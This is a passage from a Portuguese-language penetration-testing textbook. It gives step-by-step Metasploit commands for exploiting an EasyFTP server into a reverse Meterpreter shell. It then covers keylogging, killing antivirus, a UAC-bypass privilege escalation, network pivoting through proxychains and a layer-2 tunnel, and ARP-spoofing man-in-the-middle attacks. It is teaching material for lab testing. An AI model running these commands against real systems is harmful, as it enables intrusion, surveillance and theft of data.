nais\ta\tserem\tconfigurados:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tshow\toptions\nModule\toptions\t(exploit/windows/ftp/easyftp_cwd_fixret):\n\t\t\tName\t\t\t\t\tCurrent\tSetting\t\t\t\t\t\tRequired\t\tDescription\n\t\t\t----\t\t\t\t\t---------------\t\t\t\t\t\t--------\t\t-----------\n\t\t\tFTPPASS\t\tmozilla@example.com\t\tno\tThe\tpassword\tfor\tthe\tspecified\tusername\n\t\t\tFTPUSER\t\tanonymous\t\t\t\t\t\t\t\t\t\t\t\tno\tThe\tusername\tto\tauthenticate\tas\n\t\t\tRHOST\t\t\t\t192.168.1.101\t\t\t\t\t\t\t\tyes\tThe\ttarget\taddress\n\t\t\tRPORT\t\t\t\t21\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tyes\tThe\ttarget\tport\n\t\nPayload\toptions\t(windows/meterpreter/reverse_tcp):\nNameCurrent\tSettingRequiredDescription\n--------------------------------------\nEXITFUNC\t\tprocess\t\tyes\tExit\ttechnique\t(accepted:\tseh,\tthread,\tprocess,\tnone)\nLHOST\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tyes\tThe\tlisten\taddress\nLPORT\t\t\t\t\t4444\t\t\t\t\tyes\tThe\tlisten\tport\n\t\nExploit\ttarget:\nId\t\tName\n--\t\t----\n0\t\t\tWindows\tUniversal\t-\tv1.7.0.2\nmsf\texploit(easyftp_cwd_fixret)\t>\nOs\tparâmetros\tque\tdevem\tser\tconfigurados\tsão\tmarcados\tcomo\tRequired\tyes:\nOs\tcampos\tEXITFUNC\t(método\tpara\tfinalizar\ta\tnossa\tconexão\t–\tcomo\tpadrão\to\nMetasploit\tfinaliza\ta\tconexão\tpor\tprocesso),\tLPORT\t(porta\tlocal\tque\to\nMetasploit\tficará\tlistando\tpara\treceber\tconexões\t–\tpré-configurado\tcomo\tsendo\na\tporta\t4444)\te\to\tcampo\tLHOST\t(Endereço\tIP\tlocal\tdo\tKali\tLinux\tque\treceberá\na\tconexão\treversa\tcom\to\tshell\tde\tcomandos\tdo\tWindows\tno\tmomento\tem\tque\ta\nvulnerabilidade\tfor\texplorada).\n•\tVamos\tconfigurar\to\tpayload:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tset\tLHOST\t192.168.1.100\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tset\tLPORT\t12345\n•\tVamos\tver\tquais\tsão\tas\tversões\tvulneráveis\tdo\tEasyFTP:msf\n\texploit(easyftp_cwd_fixret)\t>\tshow\ttargets\n•\tVamos\tconfigurar\to\texploit\tcom\ta\tversão\tvulnerável:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tset\tTARGET\t9\n•\tVamos\tutilizar\to\texploit:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\texploit\nA\tsessão\tMeterpreter\testá\tativa\te\ttemos\to\tcontrole\tsobre\ta\tmáquina\tWindows:\nmeterpreter\n\t>\n9.4\tPayload\tMeterpreter\nO\tpayload\tMeterpreter\tpossibilita\talgumas\tfunções\tao\tteste\tde\tpenetração,\tcomo\ncaptura\tda\ttela,\tteclas\tdigitadas,\tupload,\tdownload\tetc.\nCom\to\tMeterpreterativo,\tvamos\tutilizar\talgumas\tde\tsuas\tfunções\tbásicas:\n9.4.1\tCore\tcommands\n•\tPara\tobter\tajuda\tdas\tfunções\tdo\tMeterpreter:\nmeterpreter\n\t>\thelp\n•\tPara\tfinalizar\ta\tsessão\te\tsair\tdo\tMeterpreter:\nmeterpreter\n\t>\texit\n•\tÀs\tvezes\tserá\tnecessário\tmanter\ta\tsessão\tativa\tdo\tMeterpreter\t(para\toutra\nfinalidade,\tpor\texemplo,\tpara\tusar\tum\tmódulo\tauxiliar),\tporém\tem\nbackground:\nmeterpreter\n\t>\tbackground\n•\tVer\tquais\tsessões\tdo\tMeterpreter\testão\tativas:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tsessions\nActive\tsessions\n===============\nId\t\t\nType\t\t\tInformation\tConnection\n--\t\t----\t\t\t-----------\t----------\n1\n\t\t\tmeterpreter\tx86/win32\tPC\\win7\t@\tPC\t192.168.1.100:12345\t->\t192.168.1.101:1060\n(192.168.1.101)\nmsf\n\texploit(easyftp_cwd_fixret)\t>\n•\tPara\tinteragir\tnovamente\tcom\to\tMeterpreter:msf\n\texploit(easyftp_cwd_fixret)\t>\tsessions\t–i\tnumero_ID\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tsessions\t-i\t1\nUma\tfuncionalidade\tdo\tMeterpreter\té\tconseguir\tmigrar\tpara\toutro\tprocesso.\tPor\nexemplo,\to\tMeterpreter\testá\trodando\tcomo\tprocesso\tEasyFTP,\tcaso\to\tusuário,\npor\talgum\tmotivo,\tdesabilite\to\tEasyFTP,\ta\tconexão\tdo\tMeterpreter\tserá\tperdida.\nSe\ta\tsessão\tfor\tmigrada\tpara\toutro\tprocesso,\tmesmo\tque\to\tusuário\tfinalize\to\nEasyFTP,\ta\tsessão\tmantém-se\tativa.\n•\tMigrar\tpara\toutro\tprocesso:\nmeterpreter\n\t>\trun\tmigrate\t-f\n9.4.2\tFile\tsystem\tcommands\nComandos\tbásicos\tde\tcriação\tde\tpasta,\tdownload,\tupload\tde\tarquivos\tetc.\n•\tExibir\to\tdiretório\tatual:\nmeterpreter\n\t>\tpwd\n•\tMudar\tde\tdiretório:\nmeterpreter\n\t>\tcd\tpasta\n•\tCriar\tpasta:\nmeterpreter\n\t>\tmkdir\tpasta\n•\tEditar\tum\tarquivo\tde\ttexto:\nmeterpreter\n\t>\tedit\tmensagem.txt\n•\tVisualização\tsobre\to\tconteúdo\tde\tum\tarquivo\tde\ttexto:\nmeterpreter\n\t>\tcat\tmensagem.txt\n•\tDownload\tde\tarquivos:\nmeterpreter\n\t>\tdownload\t'C:\\Users\\win7\\Desktop\\arquivo.exe'\t/root/Desktop\n•\tUpload\tde\tarquivos:\nmeterpreter\n\t>\tupload\t/root/upload.txt\t'C:\\Users\\win7\\Desktop'\n9.4.3\tNetworking\tcommands\nComandos\trelativos\tà\trede,\tcomo\ttabela\tARP,\tIP\te\tconexões\tativas.\n•\tVisualização\tda\ttabela\tARP:\nmeterpreter\n\t>\tarp•\tVisualização\tdo\tIP\t(LAN):\nmeterpreter\n\t>\tifconfig\n•\tVisualização\tde\tconexões\tativas:\nmeterpreter\n\t>\tnetstat\n9.4.4\tSystem\tcommands\nComandos\trelativos\tao\tsistema,\tvisualização\tde\tprocessos\te\texecução\tde\narquivos.\n•\tInformações\tdo\tcomputador:\nmeterpreter\n\t>\tsysinfo\n•\tDesligar\ta\tmáquina:\nmeterpreter\n\t>\tshutdown\n•\tReiniciar\ta\tmáquina:\nmeterpreter\n\t>\treboot\n•\tObter\tversão\tdo\tsistema:\nmeterpreter\n\t>\tsysinfo\n•\tObter\to\tshell:\nmeterpreter\n\t>\tshell\n•\tIdentificação\tdo\tusuário\tatual:\nmeterpreter\n\t>\tgetuid\n•\tExecutar\tum\tarquivo:\nmeterpreter\n\t>\texecute\t–f\tcalc.exe\n•\tExecutar\tum\tarquivo\tde\tmodo\toculto\t(não\tsão\ttodos\tos\tarquivos\tque\taceitam\na\tsua\texecução\tem\tmodo\tinvisível):\nmeterpreter\n\t>\texecute\t–f\tnotepad.exe\t-H\n•\tVer\tos\tprocessos\tativos\t(editado\tpor\tmotivos\tvisuais):\nmeterpreter\n\t>\tps\nProcess\tList\n============\nPID\t\t\nPPID\t\tName\t\tArch\t\tSession\t\tUser\t\tPath\n---\t\t----\t\t----\t\t----\t\t-------\t\t----\t\t----0\t\t\t\t\t0\t\t\t\t[System\tProcess]\t\t4294967295\n4\t\t\t\t\t0\t\t\t\tSystem\t\t\t\t\t\t\t\t\t\t\t\t4294967295\n100\n\t\t\t336\t\t\ncalc.exe\n\t\tx86\t1\tPC\\win7\tC:\\Windows\\system32\\calc.exe\n268\t\t\t4\t\t\t\tsmss.exe\t\t4294967295\nmeterpreter\t>\n•\tFinalizar\tprocesso\t(\nkill\tPID\n).\tPara\tfinalizar\ta\tcalculadora,\t\nkill\t100\n:\nmeterpreter\n\t>\tkill\t100\n9.4.5\tUser\tInterface\tcommands\n•\tKeylogger\tonline:\nmeterpreter\n\t>\tkeyscan_start\tInicia\to\tkeylogger\nmeterpreter\n\t>\tkeyscan_dump\tExibe\tas\tteclas\tdigitadas\nmeterpreter\n\t>\tkeyscan_stop\tFinaliza\to\tkeylogger\n•\tCaptura\tde\ttela\t(screenlogger):\nmeterpreter\n\t>\tscreenshot\n•\tChecar\tse\ta\tmáquina\té\tuma\tmáquina\tvirtual:\nmeterpreter\n\t>\trun\tcheckvm\n•\tFinalizar\tprocessos\tde\tantivírus:\nmeterpreter\n\t>\trun\tkillav\n•\tInicializar\tVNC:\nmeterpreter\n\t>\trun\tvnc\nUm\tpasso\tmuito\timportante\tquando\tse\trealiza\tum\tpentest\té\to\tescalonamento\tde\nprivilégios.\tNormalmente,\tquando\tum\tacesso\té\tobtido,\té\trealizado\tde\tforma\nrestrita,\tcom\to\tprivilégio\tdo\tusuário\tque\tinicializou\to\tprograma.\t\nPor\texemplo,\tse\no\tusuário\trestrito\t\nwin7\n\tinicia\to\tprograma\t\nEasy-ftp.exe\n,\te\to\tatacante\texplora\tuma\nfalha\tno\t\nEasy-ftp.exe\n,\teste\tconsegue\tacesso\tao\tsistema\tcom\tos\tprivilégios\tdo\nusuário\trestrito\t\nwin7\n.\tOu\tseja,\to\tatacante\tnão\ttem\tpermissões\tde\talto\tnível,\tcomo\ncapturar\tarquivos\tde\tsenha\tdo\tsistema\tou\tapagar\to\tsistema\tde\tlog\n1\n.\tÉ\tnecessário,\nportanto,\tescalonar\tos\tprivilégios\tpara\tum\tacesso\tcompleto\tà\tmáquina.\n•\tGanhar\tacesso\tautoridade\t(usuário\t\nnt\tauthority\\System\n):\nmeterpreter\n\t>\tbackground\nmsf\n\t>\tuse\texploit/windows/local/bypassuac\nmsf\n\texploit(bypassuac)\t>\tsessionsmsf\n\texploit(bypassuac)\t>\tset\tSESSION\tsesssao_meterpreter\nmsf\n\texploit(bypassuac)\t>\texploit\nmeterpreter\n\t>\tgetsystem\nmeterpreter\n\t>\tgetuid\nOutra\tforma\tpara\tescalar\tprivilégios\tque\tpode\tser\tutilizada\té\tmigrando\to\nprocesso\tdo\tMeterpreter\tpara\talgum\tprocesso\tde\talto\tnível.\tPor\texemplo,\tse\tpor\nalgum\tmotivo\to\tleitor\texecutar\to\texploit\t\nexploit/windows/local/bypassuac\n,\te\to\ncomando\t\ngetsystem\n\tfalhar,\to\tleitor\tpoderá\tlistar\tos\tprocessos\tativos\tna\tmáquina\n(por\tmeio\tde\t\nps\n)\te\tmigrar\tpara\talgum\tprocesso\tque\tseja\tcontrolado\tpor\t\nnt\nauthority\\system\n\t(pelo\t\nmigrate\n).\tO\tprocesso\t\nlsass.exe\n\té\tde\talto\tnível.\nOutro\texploit\tque\tpode\tser\tutilizado\té\to\t\nbypassuac_injection\n,\tque\trealiza\ta\nescalação\tde\tprivilégios\tpor\tmeio\tda\tinjeção\tde\tDLL\t(tenta\tse\tevadir\tde\nantivírus).\nDesafio\to\tleitor\ta\tler\tsobre\tesse\tmódulo\te\texecutá-lo.\n9.5\tPivoting\tcom\tMetasploit\nUma\tdas\tmelhores\thabilidades\tdo\tMeterpreter\té\ta\trealização\tdo\tpivoting.\nA\ttécnica\tde\tpivoting\tconsiste\tem,\tpor\tmeio\tde\tuma\tmáquina\tcomprometida\tpelo\nMeterpreter,\tconseguir\tacesso\ta\toutras\tmáquinas\tda\trede.\tIsso\tmesmo,\tpor\tmeio\ndo\tpivoting,\té\tpossível\tconseguir\tacesso\ta\tuma\tmáquina\tprotegida\tpor\tfirewall.\nPor\texemplo:\tSupondo\tuma\tmáquina\tA\trodando\tum\tserviço\tSMTP\tque\testeja\nem\tuma\tDMZ\t(zona\tdesmilitarizada\t–\tonde\tnão\thá\tregras\tde\tfirewall\te\trestrições\nde\tacesso.\tNormalmente\tuma\tDMZ\té\tconfigurada\tpara\tacesso\tpúblico,\tcomo\tum\nservidor\tweb\tou\temail).\tDessa\tforma,\tqualquer\tpessoa\tna\tinternet\ttem\tacesso\tao\nserviço\tde\temail\t(SMTP).\nUma\tvez\tque\ta\tversão\tdesse\tserviço\té\tfalha\te\ta\tmáquina\tfoi\tcomprometida\tcom\no\tMeterpreter,\té\tpossível\tusar\ta\tmáquina\tA\tpara\trealizar\tataques\tcontra\ta\nmáquina\tB\tque\testá\tprotegida\tpor\tfirewall\tdentro\tda\trede.\tÉ\ta\tmáquina\tA\tque\tvai\nrealizar\tataques\tcontra\ta\tmáquina\tB.\tA\tmáquina\tA\té\tpivô\tde\toutros\tataques.\tÉ\ta\nmáquina\tlaranja\tusada\tpara\toutros\tataques.\nO\tprocesso\tde\tpivoting\té\tmostrado\tna\tfigura\t9.1.\nPara\trealizar\to\tataque\tde\tpivô,\tprimeiro\tconsiga\tacesso\tao\tsistema\tvia\nMeterpreter\n.Execute\to\tmódulo\t\nget_local_subnets\n\tpara\tacessar\ta\tsubnet\tda\tmáquina\tcom\to\nMeterpreter:\nmeterpreter\n\t>\trun\tget_local_subnets\nLocal\tsubnet:\t192.168.1.0/255.255.255.0\nColoque\to\tMeterpreter\tem\tbackground\tpara\texecução\tde\toutros\tcomandos:\nmeterpreter\n\t>\tbackground\nFigura\t9.1\t–\tAtaque\tde\tpivô.\nAdicione\tuma\trota\tentre\ta\tsua\tmáquina\te\ta\tsubnet\tda\tmáquina\tcom\to\nMeterpreter:\nroute\tadd\t192.168.1.0\t255.255.255.0\tnum\nSendo\t\nnum\n\to\tnúmero\tda\tsessão\tMeterpreter.\nA\trota\tentre\ta\tsua\trede\tlocal\te\ta\trede\tlocal\tda\tmáquina\tcomprometida\tfoi\nadicionada\tcom\tsucesso.\tImprima\ta\trota\tcom\to\tcomando:\nroute\tprint\nActive\tRouting\tTable\n====================\nSubnet\t\t\t\t\t\t\t\tNetmask\t\t\t\t\t\t\t\tGateway\n------\t\t\t\t\t\t\t\t-------\t\t\t\t\t\t\t\t-------\n192.168.1.0\t\t\t255.255.255.0\t\tSession\t1\nA\túltima\tetapa\tconsiste\tem\tacessar\tas\toutras\tmáquinas\tpor\tmeio\tda\tmáquina\ncomprometida,\tpara\tisso\té\tnecessário\tcriar\tum\tproxy\tsocks\tque\tvai\ttunelar\ta\nconexão.\nmsf\n\texploit(handler)\t>\tuse\tauxilary/server/socks4a\nmsf\n\tauxiliary(socks4a)\t>\texploit\nFoi\tcriado\tum\tsocket\tlocal\tlistando\tna\tporta\t1080\t(socket\tde\ttunelamento\tentre\ta\nrede\tlocal\te\ta\trede\tremota).A\túltima\tetapa\tconsiste\tem\tacessar\ta\tmáquina\tB\tpor\tmeio\tda\tmáquina\tA\n(máquina\tcomprometida\tcom\to\tMeterpreter),\tconforme\tmostra\ta\tfigura\t9.1.\tPara\nisso\té\tnecessário\tum\tprograma\tde\tproxy\tespecífico:\to\tproxychains.\nO\tproxychains\té\tum\tprograma\tque\trealiza\ttunelamento\tentre\tdiversos\tservidores\nproxy.\tOu\tseja,\to\tproxychains\tacessa\to\tproxy\tABC,\tfaz\tum\ttunelamento\tpara\to\nproxy\tDEF,\tfaz\tum\ttunelamento\tpara\to\tproxy\tGHI\te\tassim\tsucessivamente,\tsem\nlimites.\nO\tproblema\té\tque\tquanto\tmais\tproxies\tforem\tutilizados\te\tmaior\tfor\ta\tsua\tcadeia,\nmais\tlenta\tficará\ta\tconexão\taté\ttornar-se\tinviável.\nConfigure\to\tarquivo\t\n/etc/proxychains.conf\n\tpara\tacessar\to\tproxy\tlocal\tlistando\tna\nporta\t1080:\ndynamic_chain\nproxy_dns\ntcp_read_time_out\t15000\ntcp_connect_time_out\t8000\n[ProxyList]\nsocks4\t127.0.0.1\t1080\nOpte\tsempre\tpela\tescolha\tde\tproxies\tcom\tcadeias\tdinâmicas\t(\ndynamic_chain\n),\npois,\tnesse\tmodo,\tse\tum\tproxy\tda\tlista\testiver\tindisponível,\tserá\tacessado\to\npróximo\te\tassim\tsucessivamente.\tNo\tmodo\tde\tcadeia\testrita\t(\nstrict_chain\n),\tcada\nproxy\té\tacessado\tsequencialmente,\tassumindo\tque\ttodos\tos\tproxies\testão\tOK\te\nsem\tnenhum\ttipo\tde\tproblema.\tInicialize\to\tproxychains\tpor\tmeio\tda\tsintaxe\nproxychains\t\nprograma\n.\tPor\texemplo:\nroot@kali#\n\tproxychains\ticeweasel\nAs\tconexões\tsairão\tda\tmáquina\tA\te\tnão\tmais\tda\tmáquina\tdo\tatacante.\nAtentem\tpara\to\tfato\tde\tque\tem\tuma\tconexão\tpivô\tcom\to\tMeterpreter,\tdevido\tàs\nlimitações\tde\tservidores\tproxies\tdo\ttipo\tsocks,\ta\tconexão\tdeve\testabelecer\to\t\n3-\nway\thandshake\n\te\to\tICMP\tEcho\tRequest\t(ping)\tnão\té\tsuportado.\tDessa\tforma,\nquando,\tpor\texemplo,\tprogramas\tcomo\to\tNmap\tsão\tutilizados,\té\tnecessário\nespecificar\ta\tsua\tsintaxe\tpara\tque\to\tNmap\tfaça\tuma\tvarredura\tcom\to\t\n3-way\nhandshake\n\tcompleto\t(\n-sT\n)\te\tnão\tutilize\to\tprotocolo\tICMP\t(\n-Pn\n).\nroot@kali#\n\tproxychains\tnmap\t–sT\t–PN\t192.168.1.0/24\n9.6\tVPN\tPivoting\t(Pivoting\tvia\tLayer\t2)Realizar\tpivoting\tcom\to\tMeterpreter,\tapesar\tde\tser\tmuito\tbom,\trestringe-nos\ta\ndeterminados\tprotocolos.\tPor\texemplo:\tpor\tmeio\tdo\tpivoting\tcom\to\tMetasploit\neu\tpreciso\tcompletar\to\t\n3-way\thandshake\n,\tpois\tesse\ttipo\tde\tpivoteamento\tnão\nsuporta\tICMP,\trequisições\tARP\t(O\tARP\testá\tlocalizado\tna\tcamada\t2\tdo\tmodelo\nOSI)\tetc.\tIsso\té\tnormal\tdevido\tàs\tpróprias\tlimitações\tdo\tsocks4/socks5.\nCom\to\tpivô\tfeito\tpelo\tMeterpreter\tnão\té\tpossível\trealizar\tataques\tde\tbaixo\tnível\n(por\texemplo:\tataques\tvoltados\tà\tcamada\t2,\tcomo\to\tMan-in-the-Middle).\nEm\tvez\tde\trealizar\to\tpivoteamento\tcom\to\tMeterpreter,\té\tpossível\trealizar\to\npivoteamento\tna\tcamada\t2.\tEsse\tprocesso\té\tmuito\tsemelhante\ta\tuma\tVPN.\tA\ndiferença\tentre\ta\tVPN\te\to\tnosso\tpivoteamento\té\ta\tquestão\tda\tcriptografia.\tOs\nnossos\tdados\tserão\ttrafegados\tem\tclaro,\tmas\tfundamentalmente\tnós\tvamos\tobter\nas\tmesmas\tvantagens\t(podemos\trealizar\tataques\tMan-in-the-Middle,\tnão\nprecisamos\testabelecer\to\t\n3-way\thandshake\n,\tfecharemos\to\ttúnel\tcliente/servidor\nem\tum\tprocesso\tbem\tparecido\tcom\tuma\tVPN\tetc.),\tportanto\tvamos\ttratar\to\nsoftware\te\to\tprocesso\tde\tpivoteamento\tcomo\tpivoting\tvia\tVPN.\nA\texcelente\tferramenta\tLayer-2-Pivoting-client\tfoi\tdesenvolvida\tpor\tRaphael\nMudge,\tcriador\tdos\tframeworks\tCobalt\tStrike\te\tArmitage.\tUma\talternativa\tao\nMetasploit\tque\té\tutilizada\tem\ttestes\tde\tintrusão.\tAntes\tde\tutilizarmos\ta\nferramenta\tdo\tRaphael,\tvamos\tentender\to\tque\té\te\tcomo\tfunciona\tuma\tVPN.\nUma\tVPN\t(Virtual\tPrivate\tNetwork)\tpermite\tque\to\ttráfego\tde\tdados\tseja\ntransmitido\tpor\tmeio\tde\tuma\trede\tinsegura\t(como\ta\tinternet),\tinterligando\tduas\nou\tmais\tredes.\nPor\texemplo,\tsupondo\tque\tuma\torganização\tpossua\tsua\trede\tA\tlocalizada\tno\nestado\tX.\tEssa\tmesma\torganização\tpossui\tuma\tfilial\tB\tlocalizada\tno\testado\tY.\nOu\tseja,\ta\trede\tA\te\trede\tB\testão\tmuito\tlonge\tfisicamente.\tSupondo\tque\ta\norganização\tdeseje\tmanter\tum\tcanal\tde\tcomunicação\tentre\tredes\tA\te\tB,\tou\tseja,\nos\tusuários\tda\trede\tA\tquerem\tacessar\tos\trecursos\tda\trede\tB\t(por\texemplo:\tos\nusuários\tda\trede\tA\tdesejam\tacessar\talgum\tservidor\tou\tprocesso\tque\troda\tem\numa\testação\tna\trede\tB).\tSupondo\ttambém\tque\ta\torganização\tnão\tqueira\tem\nhipótese\talguma\tdeixar\tos\tativos\tda\trede\tB\tem\tuma\tDMZ\t(isso\tseria\tperigoso\ndemais).\tTeoricamente\tisso\tseria\timpossível,\te\té\tnesse\tmomento\tque\tentra\ta\nVPN.\tPor\tmeio\tda\tVPN\tos\tusuários\tda\trede\tA\tcriam\tum\ttúnel\tpor\tmeio\tda\ninternet\te\tconseguem\tacesso\tà\trede\tB.\tDessa\tforma,\ta\trede\tA\tterá\tuma\tnova\ninterface\tde\trede\tconfigurada\tcom\to\tIP\tde\tLAN\tda\trede\tB,\tcomo\tse\ta\trede\tAestivesse\tna\tprópria\tLAN\tda\trede\tB.\tA\tfigura\t9.2\tmostra\tesse\tprocesso.\nLayer-2-Pivoting-client\tsegue\tum\tprincípio\tsemelhante\ta\tuma\tVPN,\nestabelecendo\tum\ttúnel\tentre\tas\tduas\textremidades:\to\tsoftware\tservidor\n(atacante)\tcria\tuma\tinterface\tvirtual\tno\tLinux\tesperando\tpor\tconexões\tdo\tcliente\nWindows\t(vítima).\tQuando\tuma\tconexão\tdo\tcliente\tfor\tefetuada\tcom\tsucesso\tno\nservidor,\ta\tinterface\tvirtual\tdo\tservidor\tobterá\to\tendereço\tIP\tda\trede\tdo\tcliente,\nestabelecendo\tuma\tconexão\tVPN.\nFigura\t9.2\t–\tIlustração\tde\tuma\tVPN.\nPrimeiro,\tdevemos\tconfigurar\to\tsoftware\tservidor\tque\tlistará\tpor\tconexões\tno\nKali\tLinux.\nRealize\to\tdownload\tdo\tarquivo\t\nsimpletun.c\n\tem\t\nhttps://backreference.org/wp-\ncontent/uploads/2010/03/simpletun.tar.bz2.\nModifique\ta\tlinha\t42\te\taltere\to\tvalor\tdo\tBUFSIZE\tde\t2000\tpara\t8192\t(um\tvalor\nmais\talto\tpara\to\tbuffer,\tpois\tvalores\tinferiores\tpodem\ttravar\to\tsoftware).\nCompile\to\tarquivo\tcom\to\tgcc:\nroot@kali#\n\tgcc\tsimpletun.c\t-o\tsimpletun\nExecute\to\tarquivo\tpara\tvisualizar\tas\topções:\nroot@kali#\t\n./simpletun\nPara\tlistarmos\tpor\tconexões,\tos\tseguintes\tparâmetros\tserão\tutilizados:\nroot@kali#\t\n./simpletun\t-i\ttap0\t-s\t-p\t8081\t-a\nDessa\tforma,\to\tsimpletun\tcriará\tuma\tinterface\tvirtual\t\ntap0\n\t(pode\tser\tqualquer\nnome)\tque\tvai\treceber\to\tIP\tda\trede\tvítima\t(\n-i\ttap0\n)\te\tficará\tlistando\tpor\tconexões\nem\tmodo\tservidor\t(\n-s\n),\te\tna\tporta\t8081\t(\n-p\t8081\n).\tA\topção\t\n-a\n\tindica\tque\to\nsimpletun\tcriará\tuma\tinterface\tdo\ttipo\tTAP.\nLembre-se\tde\thabilitar\tum\tredirecionamento\tde\tportas\tno\troteador\tpara\tque\to\ntráfego\tdestinado\tà\tporta\t8081\tseja\tredirecionado\tao\tKali\tLinux.O\tsoftware\tLayer-2-Pivoting-client\tpode\tser\tobtido\tem\nhttps://github.com/rsmudge/Layer2-Pivoting-Client\n.\nO\tsoftware\tnecessário\té\to\t\nclient.exe\n.\tEsse\tsoftware\té\texecutado\tem\tambientes\nWindows.\tAntes\tde\texecutá-lo,\tinstale\ta\tsuíte\tWinPCap,\tque\tpode\tser\tobtida\tem\nhttps://www.winpcap.org/install/default.htm\n.\nComo\tmostrado\tna\tfigura\t9.2,\tpara\tesse\tlaboratório\tserão\tnecessárias\tduas\tredes\ndistintas\tcom\tIPs\tdiferentes.\nAssume-se\tque\to\tKali\tLinux\testá\tna\trede\tA\tcom\to\tIP\t192.168.1.0/24,\te\to\nWindows\testá\tna\trede\tB\tcom\to\tIP\t10.0.0.0/24.\nNa\tmáquina\tWindows,\tconecte-se\tà\trede\tcom\to\tKali\tLinux:\nC:\\\t\nclient.exe\tIP_Publico_roteador_Kali\tPorta_Kali\tIP_Local_Windows\nC:\\\n\tclient.exe\tIP_Publico_roteador_Kali\t8081\t10.0.0.2\n\t\nNota:\n\tO\tIP\tpúblico\tdo\troteador\tda\trede\tem\tque\testá\to\tKali\tLinux\tpode\tser\tobtido\tatravés\tdo\tsite\nhttp://www.meuip.com.br\n.\n\t\nA\tinterface\t\ntap0\n\tno\tKali\tLinux\tdeve\treceber\ttráfego;\tverifique\tse\to\tcampo\t\nRX\nbytes\n\taumentou\te\tsaiu\tdo\tvalor\t0:\nroot@kali#\t\nifconfig\ttap0\nSe\to\tvalor\taumentou,\tentão\to\ttúnel\tfoi\testabelecido\tcom\tsucesso.\tPor\túltimo,\nfaça\tcom\tque\tessa\tinterface\treceba\tIP\tvia\tDHCP\tda\trede\tB:\nroot@kali#\n\tdhclient\ttap0\nRealizando\tum\t\nifconfig\n\tnovamente,\ta\tinterface\t\ntap0\n\tterá\tum\tIP\tda\tfaixa\n10.0.0.0/24.\nroot@kali#\n\tifconfig\ttap0\nSe\to\tleitor\testiver\tfamiliarizado\tcom\tataques\tde\tMan-in-the-Middle\te\tcom\tos\nutilitários\tarpspoof\te\tSSLSplit,\trecomendo\tque\tcontinue\ta\tleitura;\tcaso\tcontrário,\numa\tmelhor\texplicação\tsobre\tataques\tMan-in-the-Middle\te\tcomo\tutilizar\tas\nferramentas\tarpspoof\te\tSSLSplit\tencontram-se\tna\tseção11.4,\t“Ataques\tMan-in-\nthe-Middle\t(MitM).\nAntes\tde\trealizar\to\tataque\tde\tMan-in-the-Middle,\tnós\tdevemos\tconfigurar\to\tKali\nLinux\t(máquina\tatacante)\tpara\tque\tfaça\to\tcorreto\troteamento\tde\tpacotes\te\tfluxo\nde\tdados.Primeiro,\tative\to\troteamento\tde\tpacotes\t(IP\tForward):\nroot@kali#\n\techo\t1\t>\t/proc/sys/net/ipv4/ip_forward\nQuando\to\ttúnel\té\tativado,\tum\tfato\tinteressante\ta\tser\tnotado\té\tque\tos\tdados\tda\nrede\tB\tpassam\tpelo\ttúnel\te\tchegam\tà\trede\tA\t(a\trede\tB\ttambém\tse\tcomunica\tcom\na\trede\tA),\tentão\tnós\tdevemos\tpermitir\to\tmascaramento\tde\tdados\tpara\tque\tos\ndados\tde\tB\tcheguem\tà\trede\tA\te\ttrafeguem\tpela\tinternet:\nroot@kali#\n\tiptables\t–t\tnat\t–A\tPOSTROUTING\t–o\teth0\t–j\tMASQUERADE\nConsidere\tque\ta\tinterface\t\neth0\n\té\ta\tinterface\tcabeada\tque\testou\tutilizando\tpara\ta\nconexão.\nRealizar\tum\tataque\tde\tMan-in-the-Middle\té\tsimples:\tpara\tisso,\tvamos\tutilizar\to\nprograma\tarpspoof,\tinformando\tqual\tserá\to\tIP\tque\tdesejamos\trealizar\to\tMan-in-\nthe-Middle\t(vamos\trealizar\tsobre\to\tIP\t10.0.0.3\t–\tuma\tvítima\tqualquer\tna\trede)\te\nqual\tserá\to\troteador\t(IP\t10.0.0.1).\nroot@kali#\n\tarpspoof\t–i\ttap0\t–t\t10.0.0.3\t10.0.0.1\nEspecificamente,\tutilizando\to\tsoftware\tdo\tRaphael,\to\tMain-in-the-Middle\tnão\nenvenena\ttoda\ta\ttabela\tARP\tda\tnossa\tvítima.\tMas\tnão\ttem\tproblema,\tpois\to\tseu\ngateway\té\to\tendereço\tMAC\tdo\tatacante.\nC:\\\t\narp\t-a\nInterface:\t192.168.1.101\t---\t0xb\nEndereço\tInternet\t\tEndereço\tfísico\t\t\t\tTipo\n192.168.1.1\t\t\t\t\t\t\t\t9a-e0-3d-8f-23-a1\t\t\ndinâmico\n192.168.1.50\t\t\t\t\t\t\t00-13-d4-ec-d4-ea\t\tdinâmico\n192.168.1.100\t\t\t\t\t\t00-23-15-73-86-6c\t\tdinâmico\n192.168.1.103\t\t\t\t\t\t9a-e0-3d-8f-23-a1\t\t\ndinâmico\n192.168.1.104\t\t\t\t\t\t24-f5-aa-55-7c-66\t\tdinâmico\n192.168.1.255\t\t\t\t\t\tff-ff-ff-ff-ff-ff\t\testático\nRealize\ta\tcaptura\tcom\to\tseu\tsniffer\te,\tcom\ta\tmáquina\t10.0.0.3,\tacesse\tum\tsite\nHTTP.\tO\tataque\tde\tMan-in-the-Middle\tentre\tduas\tredes\tdistintas\tfoi\trealizado\ncom\tsucesso.\n\t\nNota:\n\tEm\ttestes\tpessoais,\trealizar\to\tataque\tpor\tmeio\tdesse\tutilitário\tnos\trestringe\tquanto\taos\tataques\ncom\to\tprotocolo\tHTTPS,\tou\tseja,\tnão\tconseguimos\tutilizar\to\tSSLStrip\tpara\tdecriptografar\to\ttráfego.\nPara\tresolver\tesse\tproblema,\tvamos\tutilizar\to\tSSLSplit.\n\t\nO\tSSLSplit\tatua\tde\tforma\tsimilar\tao\tSSLStrip,\tdando\tao\tcliente\tum\tcertificadofalso,\tfingindo\tser\taquele\tservidor\tHTTPS.\nVamos\tcriar\tum\tdiretório\tem\t\n/tmp\n\tpara\tque\to\tSSLSplit\tarmazene\to\tnosso\ntráfego:\nroot@kali#\n\tmkdir\t-p\t/tmp/sslsplit/logdir\nroot@kali#\n\ttouch\t/tmp/sslplit/connections.log\nroot@kali#\n\tcd\t/tmp/sslsplit\nNós\tdevemos\tge